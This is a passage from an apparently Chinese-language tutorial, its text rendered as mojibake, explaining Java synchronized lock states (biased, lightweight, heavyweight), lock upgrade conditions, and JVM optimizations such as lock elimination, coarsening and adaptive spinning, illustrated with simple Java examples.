<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¯¹è±¡åˆšåˆ›å»º</li>
<li>æ²¡æœ‰çº¿ç¨‹è®¿é—®åŒæ­¥ä»£ç å—</li>
<li>æ­£å¸¸çš„å¯¹è±¡çŠ¶æ€</li>
</ul>
<h5 data-id="heading-65">åå‘é”ï¼ˆBiased Lockingï¼‰</h5>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong> ä¼˜åŒ–å•çº¿ç¨‹é‡å¤è·å–é”çš„åœºæ™¯</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåªæœ‰ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨é”</li>
<li>åŒä¸€ä¸ªçº¿ç¨‹å¤šæ¬¡è·å–åŒä¸€ä¸ªé”</li>
<li>æ²¡æœ‰çœŸæ­£çš„ç«äº‰</li>
</ul>
<p><strong>å·¥ä½œåŸç†ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<p><strong>ç¬¬ä¸€æ¬¡è·å–é”ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> çº¿ç¨‹1ç¬¬ä¸€æ¬¡è¿›å…¥synchronizedå—
<span class="hljs-bullet">2.</span> æ£€æŸ¥Mark Wordï¼šæ˜¯å¦ä¸ºå¯åå‘çŠ¶æ€ï¼Ÿ
<span class="hljs-bullet">3.</span> æ˜¯ï¼šåœ¨Mark Wordä¸­è®°å½•çº¿ç¨‹1çš„ID
<span class="hljs-bullet">4.</span> å°†é”çŠ¶æ€è®¾ç½®ä¸ºåå‘é”
<span class="hljs-bullet">5.</span> ä¹‹åçº¿ç¨‹1å†è¿›å…¥æ—¶ï¼Œç›´æ¥æ£€æŸ¥çº¿ç¨‹IDï¼Œç›¸åŒå°±ç›´æ¥æ‰§è¡Œ
</code></pre>
<p><strong>å†æ¬¡è·å–é”ï¼ˆåŒä¸€çº¿ç¨‹ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> çº¿ç¨‹1å†æ¬¡è¿›å…¥synchronizedå—
<span class="hljs-bullet">2.</span> æ£€æŸ¥Mark Wordä¸­çš„çº¿ç¨‹IDï¼šæ˜¯å¦æ˜¯è‡ªå·±ï¼Ÿ
<span class="hljs-bullet">3.</span> æ˜¯ï¼šç›´æ¥æ‰§è¡Œï¼Œæ— éœ€ä»»ä½•åŒæ­¥æ“ä½œï¼ˆå¾ˆå¿«ï¼ï¼‰
<span class="hljs-bullet">4.</span> å°±åƒ"å…æ£€é€šé“"ï¼Œæ— éœ€æ’é˜Ÿ
</code></pre>
<p><strong>ä»£ç ç¤ºä¾‹ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ç¬¬ä¸€æ¬¡ï¼šå‡çº§ä¸ºåå‘é”ï¼Œè®°å½•çº¿ç¨‹ID</span>
        <span class="hljs-comment">// ä¹‹ååŒä¸€çº¿ç¨‹ï¼šç›´æ¥æ‰§è¡Œï¼Œå‡ ä¹æ— å¼€é”€</span>
    }
}

<span class="hljs-comment">// åœºæ™¯ï¼šå•çº¿ç¨‹åœºæ™¯</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-comment">// çº¿ç¨‹Aå¤šæ¬¡è°ƒç”¨ï¼Œéƒ½å¾ˆå¿«ï¼ˆåå‘é”ä¼˜åŒ–ï¼‰</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    c.increment();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡å¼€å§‹å°±å¾ˆå¿«äº†</span>
}
</code></pre>
<p><strong>åå‘é”çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>âœ… <strong>æ€§èƒ½æå¥½</strong>ï¼šåŒä¸€çº¿ç¨‹å†æ¬¡è·å–é”å‡ ä¹æ— å¼€é”€</li>
<li>âœ… <strong>é€‚åˆå•çº¿ç¨‹åœºæ™¯</strong>ï¼šå¤§å¤šæ•°æƒ…å†µä¸‹å°±æ˜¯å•çº¿ç¨‹ä½¿ç”¨</li>
<li>âœ… <strong>å‡å°‘åŒæ­¥å¼€é”€</strong>ï¼šé¿å…CASæ“ä½œ</li>
</ul>
<p><strong>åå‘é”çš„è·å–æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ£€æŸ¥Mark Wordçš„é”æ ‡å¿—ä½ï¼ˆæ˜¯å¦ä¸º01ï¼Œå¯åå‘ï¼‰
   â”œâ”€ æ˜¯ â†’ ç»§ç»­
   â””â”€ å¦ â†’ å·²æœ‰å…¶ä»–é”çŠ¶æ€ï¼Œè·³è¿‡åå‘é”

<span class="hljs-bullet">2.</span> æ£€æŸ¥çº¿ç¨‹IDæ˜¯å¦æŒ‡å‘å½“å‰çº¿ç¨‹
   â”œâ”€ æ˜¯ â†’ ç›´æ¥è¿›å…¥åŒæ­¥ä»£ç å—ï¼ˆæœ€å¿«è·¯å¾„ï¼‰
   â””â”€ å¦ â†’ å°è¯•CASæ›¿æ¢çº¿ç¨‹ID
<span class="hljs-code">       â”œâ”€ æˆåŠŸ â†’ è·å¾—åå‘é”
       â””â”€ å¤±è´¥ â†’ æ’¤é”€åå‘é”ï¼Œå‡çº§ä¸ºè½»é‡çº§é”
</span></code></pre>
<h5 data-id="heading-66">è½»é‡çº§é”ï¼ˆLightweight Lockingï¼‰</h5>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong> å½“æœ‰å¤šä¸ªçº¿ç¨‹ç«äº‰ï¼Œä½†ç«äº‰ä¸æ¿€çƒˆæ—¶ï¼Œä½¿ç”¨CASè‡ªæ—‹ä»£æ›¿é˜»å¡</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>æœ‰å¤šä¸ªçº¿ç¨‹ç«äº‰é”</li>
<li>ä½†ç«äº‰ä¸æ¿€çƒˆï¼ˆå¤§éƒ¨åˆ†CASèƒ½æˆåŠŸï¼‰</li>
<li>ç­‰å¾…æ—¶é—´çŸ­</li>
</ul>
<p><strong>å·¥ä½œåŸç†ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<p><strong>è·å–é”çš„è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> åœ¨æ ˆä¸­åˆ›å»ºé”è®°å½•ï¼ˆLock Recordï¼‰
<span class="hljs-bullet">2.</span> å¤åˆ¶å¯¹è±¡å¤´çš„Mark Wordåˆ°é”è®°å½•ï¼ˆå¤‡ä»½ï¼‰
<span class="hljs-bullet">3.</span> CASå°è¯•å°†å¯¹è±¡å¤´çš„Mark Wordæ›¿æ¢ä¸ºé”è®°å½•çš„æŒ‡é’ˆ
   â”œâ”€ æˆåŠŸ â†’ è·å¾—è½»é‡çº§é”ï¼ˆå¾ˆå¿«ï¼Œä½¿ç”¨CASï¼‰
   â””â”€ å¤±è´¥ â†’ æœ‰å…¶ä»–çº¿ç¨‹åœ¨ç«äº‰ï¼Œè‡ªæ—‹é‡è¯•
<span class="hljs-code">       â”œâ”€ è‡ªæ—‹æˆåŠŸ â†’ è·å¾—é”
       â””â”€ è‡ªæ—‹å¤±è´¥ï¼ˆè‡ªæ—‹æ¬¡æ•°è¿‡å¤šï¼‰â†’ å‡çº§ä¸ºé‡é‡çº§é”
</span></code></pre>
<p><strong>ä¸ºä»€ä¹ˆå«"è½»é‡çº§"ï¼Ÿ</strong></p>
<ul>
<li>ä¸éœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼ˆé‡é‡çº§é”éœ€è¦ï¼‰</li>
<li>ä½¿ç”¨CASè‡ªæ—‹ï¼Œçº¿ç¨‹ä¸é˜»å¡</li>
<li>å¼€é”€æ¯”é‡é‡çº§é”å°</li>
</ul>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¤šçº¿ç¨‹ç«äº‰ï¼Œä½†ç«äº‰ä¸æ¿€çƒˆ</span>
        <span class="hljs-comment">// ä½¿ç”¨è½»é‡çº§é”ï¼šCAS + è‡ªæ—‹</span>
        count++;
    }
}

<span class="hljs-comment">// åœºæ™¯ï¼šå¤šä¸ªçº¿ç¨‹ï¼Œä½†ç«äº‰ä¸æ¿€çƒˆ</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨ï¼Œä½†å¤§å¤šæ•°æƒ…å†µä¸‹CASèƒ½æˆåŠŸ</span>
<span class="hljs-comment">// åªæœ‰å°‘æ•°æƒ…å†µéœ€è¦è‡ªæ—‹é‡è¯•</span>
</code></pre>
<p><strong>è½»é‡çº§é”çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… <strong>ä½¿ç”¨CAS</strong>ï¼šæ— é”ç¼–ç¨‹æ€æƒ³ï¼Œæ€§èƒ½å¥½</li>
<li>âœ… <strong>è‡ªæ—‹é‡è¯•</strong>ï¼šå¤±è´¥åè‡ªæ—‹å‡ æ¬¡ï¼Œé¿å…ç«‹å³é˜»å¡</li>
<li>âš ï¸ <strong>CPUæ¶ˆè€—</strong>ï¼šè‡ªæ—‹ä¼šå ç”¨CPUï¼Œä¸é€‚åˆé«˜ç«äº‰åœºæ™¯</li>
<li>âš ï¸ <strong>å¯èƒ½å‡çº§</strong>ï¼šè‡ªæ—‹å¤±è´¥åå‡çº§ä¸ºé‡é‡çº§é”</li>
</ul>
<h5 data-id="heading-67">é‡é‡çº§é”ï¼ˆHeavyweight Lockingï¼‰</h5>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong> å½“ç«äº‰æ¿€çƒˆæ—¶ï¼Œä½¿ç”¨æ“ä½œç³»ç»Ÿçº§åˆ«çš„äº’æ–¥é‡ï¼Œè®©çº¿ç¨‹é˜»å¡ç­‰å¾…</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é”ç«äº‰æ¿€çƒˆï¼ˆå¾ˆå¤šçº¿ç¨‹åŒæ—¶ç«äº‰ï¼‰</li>
<li>è½»é‡çº§é”è‡ªæ—‹å¤±è´¥ï¼ˆè‡ªæ—‹æ¬¡æ•°è¶…è¿‡é˜ˆå€¼ï¼‰</li>
<li>ç­‰å¾…æ—¶é—´å¯èƒ½å¾ˆé•¿</li>
</ul>
<p><strong>å·¥ä½œåŸç†ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<p><strong>å‡çº§è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è½»é‡çº§é”è‡ªæ—‹å¤±è´¥ï¼ˆå¤šæ¬¡CASå¤±è´¥ï¼‰
<span class="hljs-bullet">2.</span> é”å‡çº§ä¸ºé‡é‡çº§é”
<span class="hljs-bullet">3.</span> å¯¹è±¡å¤´çš„Mark WordæŒ‡å‘monitorå¯¹è±¡ï¼ˆç®¡ç¨‹ï¼‰
<span class="hljs-bullet">4.</span> ç«äº‰å¤±è´¥çš„çº¿ç¨‹è¿›å…¥é˜»å¡é˜Ÿåˆ—
<span class="hljs-bullet">5.</span> ç”±æ“ä½œç³»ç»Ÿè¿›è¡Œçº¿ç¨‹è°ƒåº¦å’Œå”¤é†’
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆå«"é‡é‡çº§"ï¼Ÿ</strong></p>
<ul>
<li>éœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼ˆæ“ä½œç³»ç»Ÿçº§åˆ«çš„mutexï¼‰</li>
<li>çº¿ç¨‹ä¼šé˜»å¡ï¼Œéœ€è¦ä¸Šä¸‹æ–‡åˆ‡æ¢</li>
<li>å¼€é”€æ¯”è½»é‡çº§é”å¤§</li>
</ul>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¾ˆå¤šçº¿ç¨‹åŒæ—¶ç«äº‰</span>
        <span class="hljs-comment">// ä½¿ç”¨é‡é‡çº§é”ï¼šçº¿ç¨‹é˜»å¡ç­‰å¾…</span>
        count++;
    }
}

<span class="hljs-comment">// åœºæ™¯ï¼šé«˜ç«äº‰</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-comment">// 100ä¸ªçº¿ç¨‹åŒæ—¶ç«äº‰ï¼Œè½»é‡çº§é”è‡ªæ—‹å¤±è´¥</span>
<span class="hljs-comment">// å‡çº§ä¸ºé‡é‡çº§é”ï¼Œå¤§éƒ¨åˆ†çº¿ç¨‹é˜»å¡ç­‰å¾…</span>
</code></pre>
<p><strong>é‡é‡çº§é”çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… <strong>é€‚åˆé«˜ç«äº‰</strong>ï¼šç«äº‰æ¿€çƒˆæ—¶æ€§èƒ½ç¨³å®š</li>
<li>âœ… <strong>èŠ‚çœCPU</strong>ï¼šé˜»å¡çš„çº¿ç¨‹ä¸å ç”¨CPU</li>
<li>âŒ <strong>å¼€é”€å¤§</strong>ï¼šéœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€</li>
<li>âŒ <strong>å“åº”æ…¢</strong>ï¼šçº¿ç¨‹é˜»å¡åéœ€è¦ç­‰å¾…è¢«å”¤é†’</li>
</ul>
<h4 data-id="heading-68">é”å‡çº§çš„æ¡ä»¶å’Œæ—¶æœº</h4>
<p><strong>å‡çº§è·¯å¾„ï¼ˆå•å‘ï¼Œä¸èƒ½é™çº§ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æ— é” â†’ åå‘é” â†’ è½»é‡çº§é” â†’ é‡é‡çº§é”
<span class="hljs-code">      ï¼ˆä¸€æ—¦å‡çº§ï¼Œä¸èƒ½é™çº§ï¼‰
</span></code></pre>
<p><strong>å‡çº§æ¡ä»¶è¯¦è§£ï¼š</strong></p>
<h5 data-id="heading-69">1. æ— é” â†’ åå‘é”</h5>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>å¯¹è±¡è¢«ç¬¬ä¸€ä¸ªçº¿ç¨‹è®¿é—®åŒæ­¥ä»£ç å—</li>
<li>JVMå¯ç”¨åå‘é”ï¼ˆJDK 15+é»˜è®¤ç¦ç”¨ï¼Œä½†äº†è§£åŸç†å¾ˆé‡è¦ï¼‰</li>
</ul>
<p><strong>æ—¶æœºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// æ— é”çŠ¶æ€</span>

<span class="hljs-comment">// ç¬¬ä¸€æ¬¡è®¿é—®</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// å‡çº§ä¸ºåå‘é”ï¼Œè®°å½•å½“å‰çº¿ç¨‹ID</span>
}
</code></pre>
<h5 data-id="heading-70">2. åå‘é” â†’ è½»é‡çº§é”</h5>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>æœ‰å…¶ä»–çº¿ç¨‹å°è¯•è·å–åå‘é”ï¼ˆå‘ç°çº¿ç¨‹IDä¸æ˜¯è‡ªå·±ï¼‰</li>
<li>åå‘é”æ’¤é”€ï¼Œå‡çº§ä¸ºè½»é‡çº§é”</li>
</ul>
<p><strong>æ—¶æœºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹1è·å¾—åå‘é”</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// åå‘é”çŠ¶æ€</span>
}

<span class="hljs-comment">// çº¿ç¨‹2å°è¯•è·å–é”ï¼ˆå‘ç°çº¿ç¨‹IDä¸æ˜¯è‡ªå·±ï¼‰</span>
<span class="hljs-comment">// è§¦å‘åå‘é”æ’¤é”€ï¼Œå‡çº§ä¸ºè½»é‡çº§é”</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// è½»é‡çº§é”çŠ¶æ€ï¼Œä½¿ç”¨CASç«äº‰</span>
}
</code></pre>
<h5 data-id="heading-71">3. è½»é‡çº§é” â†’ é‡é‡çº§é”</h5>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>è‡ªæ—‹å¤±è´¥ï¼ˆCASå¤±è´¥æ¬¡æ•°è¶…è¿‡é˜ˆå€¼ï¼Œå¦‚10æ¬¡ï¼‰</li>
<li>ç­‰å¾…çš„çº¿ç¨‹æ•°è¶…è¿‡1ä¸ª</li>
<li>è‡ªæ—‹æ—¶é—´è¿‡é•¿</li>
</ul>
<p><strong>æ—¶æœºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹ç«äº‰ï¼ŒCASé¢‘ç¹å¤±è´¥</span>
<span class="hljs-comment">// è‡ªæ—‹å¤šæ¬¡åä»ç„¶å¤±è´¥</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// å‡çº§ä¸ºé‡é‡çº§é”</span>
    <span class="hljs-comment">// å¤±è´¥çš„çº¿ç¨‹è¿›å…¥é˜»å¡é˜Ÿåˆ—</span>
}
</code></pre>
<p><strong>å‡çº§å†³ç­–æµç¨‹ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">çº¿ç¨‹å°è¯•è·å–é”
  â†“
æ˜¯å¦æœ‰ç«äº‰ï¼Ÿ
  â”œâ”€ æ—  â†’ åå‘é”ï¼ˆè®°å½•çº¿ç¨‹IDï¼‰
  â””â”€ æœ‰ â†’ è½»é‡çº§é”ï¼ˆCAS + è‡ªæ—‹ï¼‰
<span class="hljs-code">       â†“
     è‡ªæ—‹æ˜¯å¦æˆåŠŸï¼Ÿ
       â”œâ”€ æˆåŠŸ â†’ ä¿æŒè½»é‡çº§é”
       â””â”€ å¤±è´¥ï¼ˆè¶…è¿‡é˜ˆå€¼ï¼‰â†’ é‡é‡çº§é”ï¼ˆé˜»å¡ç­‰å¾…ï¼‰
</span></code></pre>
<p><strong>æŸ¥çœ‹é”çŠ¶æ€ï¼ˆäº†è§£å³å¯ï¼‰ï¼š</strong></p>
<p>å¯ä»¥ä½¿ç”¨JOLï¼ˆJava Object Layoutï¼‰å·¥å…·æŸ¥çœ‹å¯¹è±¡å¤´çš„é”çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éœ€è¦æ·»åŠ ä¾èµ–ï¼šorg.openjdk.jol:jol-core</span>
<span class="hljs-keyword">import</span> org.openjdk.jol.info.ClassLayout;

<span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
System.out.println(ClassLayout.parseInstance(obj).toPrintable());
<span class="hljs-comment">// å¯ä»¥çœ‹åˆ°Mark Wordçš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬é”çŠ¶æ€</span>
</code></pre>
<h3 data-id="heading-72">3.3 synchronizedçš„ä¼˜åŒ–</h3>
<p><strong>JVMä¼šå¯¹synchronizedè¿›è¡Œå¤šç§ä¼˜åŒ–ï¼Œæé«˜æ€§èƒ½ã€‚</strong></p>
<h4 data-id="heading-73">é”æ¶ˆé™¤ï¼ˆLock Eliminationï¼‰</h4>
<p><strong>åŸç†ï¼š</strong> JVMåœ¨JITç¼–è¯‘æ—¶ï¼Œåˆ†æä»£ç åå‘ç°æŸä¸ªé”æ²¡æœ‰å¿…è¦ï¼Œå°±è‡ªåŠ¨æ¶ˆé™¤å®ƒã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆä¼šæ¶ˆé™¤ï¼Ÿ</strong></p>
<ul>
<li>å¦‚æœå¯¹è±¡ä¸ä¼š"é€ƒé€¸"å‡ºæ–¹æ³•ï¼ˆå…¶ä»–çº¿ç¨‹è®¿é—®ä¸åˆ°ï¼‰</li>
<li>å°±æ²¡æœ‰å¤šçº¿ç¨‹ç«äº‰ï¼Œé”å°±æ²¡æœ‰å¿…è¦</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// StringBufferæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ˆå†…éƒ¨æœ‰synchronizedï¼‰</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">concatString</span><span class="hljs-params">(String s1, String s2, String s3)</span> {
    <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();  <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œä¸ä¼šé€ƒé€¸</span>
    sb.append(s1);  <span class="hljs-comment">// è¿™äº›æ“ä½œè™½ç„¶æœ‰é”ï¼Œä½†JVMä¼šæ¶ˆé™¤</span>
    sb.append(s2);
    sb.append(s3);
    <span class="hljs-keyword">return</span> sb.toString();
}

<span class="hljs-comment">// JVMåˆ†æåå‘ç°ï¼šsbæ˜¯å±€éƒ¨å˜é‡ï¼Œå…¶ä»–çº¿ç¨‹è®¿é—®ä¸åˆ°</span>
<span class="hljs-comment">// ä¼˜åŒ–ï¼šæ¶ˆé™¤StringBufferå†…éƒ¨çš„é”ï¼Œç›´æ¥æ“ä½œï¼ˆæ›´å¿«ï¼‰</span>
</code></pre>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>âœ… å¯¹è±¡æ˜¯å±€éƒ¨å˜é‡ï¼Œä¸ä¼šé€ƒé€¸å‡ºæ–¹æ³•</li>
<li>âœ… æ²¡æœ‰å…¶ä»–çº¿ç¨‹èƒ½è®¿é—®åˆ°è¿™ä¸ªå¯¹è±¡</li>
<li>âœ… JVMåœ¨JITç¼–è¯‘æ—¶æ£€æµ‹åˆ°</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong> æ¶ˆé™¤ä¸å¿…è¦çš„é”å¼€é”€ï¼Œæé«˜æ€§èƒ½</p>
<h4 data-id="heading-74">é”ç²—åŒ–ï¼ˆLock Coarseningï¼‰</h4>
<p><strong>åŸç†ï¼š</strong> å°†å¤šä¸ªè¿ç»­çš„åŠ é”ã€è§£é”æ“ä½œåˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„é”ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ç²—åŒ–ï¼Ÿ</strong></p>
<ul>
<li>é¢‘ç¹åŠ é”è§£é”æœ‰å¼€é”€</li>
<li>å¦‚æœè¿ç»­çš„åŒæ­¥å—ä½¿ç”¨åŒä¸€ä¸ªé”ï¼Œå¯ä»¥åˆå¹¶</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ åŸå§‹ä»£ç ï¼šå¤šä¸ªè¿ç»­çš„åŒæ­¥å—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count1++;  <span class="hljs-comment">// æ“ä½œ1</span>
    }
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count2++;  <span class="hljs-comment">// æ“ä½œ2</span>
    }
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count3++;  <span class="hljs-comment">// æ“ä½œ3</span>
    }
}

<span class="hljs-comment">// âœ… JVMä¼˜åŒ–åï¼šåˆå¹¶ä¸ºä¸€ä¸ªåŒæ­¥å—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count1++;  <span class="hljs-comment">// æ“ä½œ1</span>
        count2++;  <span class="hljs-comment">// æ“ä½œ2</span>
        count3++;  <span class="hljs-comment">// æ“ä½œ3</span>
    }
}
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… å¾ªç¯ä¸­çš„åŒæ­¥æ“ä½œ</li>
<li>âœ… è¿ç»­çš„åŒæ­¥å—ï¼ˆä½¿ç”¨åŒä¸€ä¸ªé”ï¼‰</li>
<li>âœ… é”çš„ç²’åº¦å¯ä»¥é€‚å½“å¢å¤§è€Œä¸å½±å“æ€§èƒ½</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong> å‡å°‘åŠ é”è§£é”çš„æ¬¡æ•°ï¼Œæé«˜æ€§èƒ½</p>
<h4 data-id="heading-75">è‡ªé€‚åº”è‡ªæ—‹ï¼ˆAdaptive Spinningï¼‰</h4>
<p><strong>åŸç†ï¼š</strong> è‡ªæ—‹æ¬¡æ•°ä¸å†å›ºå®šï¼Œè€Œæ˜¯æ ¹æ®å†å²æƒ…å†µåŠ¨æ€è°ƒæ•´ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦è‡ªé€‚åº”ï¼Ÿ</strong></p>
<ul>
<li>å›ºå®šè‡ªæ—‹æ¬¡æ•°å¯èƒ½æµªè´¹CPUï¼ˆå¤ªå¤šæ¬¡ï¼‰</li>
<li>ä¹Ÿå¯èƒ½é”™è¿‡æœºä¼šï¼ˆå¤ªå°‘äº†ï¼‰</li>
</ul>
<p><strong>è‡ªé€‚åº”ç­–ç•¥ï¼š</strong></p>
<pre><code class="hljs">å¦‚æœä¹‹å‰è‡ªæ—‹æˆåŠŸè¿‡ï¼š
  â†’ å¢åŠ è‡ªæ—‹æ¬¡æ•°ï¼ˆå¯èƒ½å¾ˆå¿«å°±èƒ½è·å¾—é”ï¼‰

å¦‚æœä¹‹å‰è‡ªæ—‹å¾ˆå°‘æˆåŠŸï¼š
  â†’ å‡å°‘è‡ªæ—‹æ¬¡æ•°ï¼ˆå‡å°‘CPUæµªè´¹ï¼‰
  â†’ ç”šè‡³ç›´æ¥é˜»å¡ï¼ˆä¸æµªè´¹æ—¶é—´è‡ªæ—‹ï¼‰
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>JVMä¼š"å­¦ä¹ "è¿™ä¸ªé”çš„ç‰¹æ€§</li>
<li>æ ¹æ®å†å²æˆåŠŸç‡è°ƒæ•´ç­–ç•¥</li>
<li>æ™ºèƒ½ä¼˜åŒ–ï¼Œæé«˜æ•ˆç‡</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong> å¹³è¡¡CPUæ¶ˆè€—å’Œæ€§èƒ½ï¼Œæ™ºèƒ½ä¼˜åŒ–</p>
<h4 data-id="heading-76">åå‘é”çš„æ’¤é”€</h4>
<p><strong>ä»€ä¹ˆæ—¶å€™æ’¤é”€åå‘é”ï¼Ÿ</strong></p>
<p><strong>æ’¤é”€åœºæ™¯ï¼š</strong></p>
<ol>
<li><strong>æœ‰å…¶ä»–çº¿ç¨‹ç«äº‰</strong>ï¼šå‘ç°çº¿ç¨‹IDä¸æ˜¯å½“å‰çº¿ç¨‹</li>
<li><strong>è°ƒç”¨hashCode()</strong>ï¼šåå‘é”çš„Mark Wordæ²¡æœ‰ç©ºé—´å­˜å‚¨hashCode</li>
<li><strong>è°ƒç”¨wait()/notify()</strong>ï¼šè¿™äº›æ–¹æ³•éœ€è¦é‡é‡çº§é”ï¼ˆmonitorï¼‰</li>
</ol>
<p><strong>æ’¤é”€è¿‡ç¨‹ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æš‚åœæ‹¥æœ‰åå‘é”çš„çº¿ç¨‹ï¼ˆå®‰å…¨ç‚¹ï¼‰
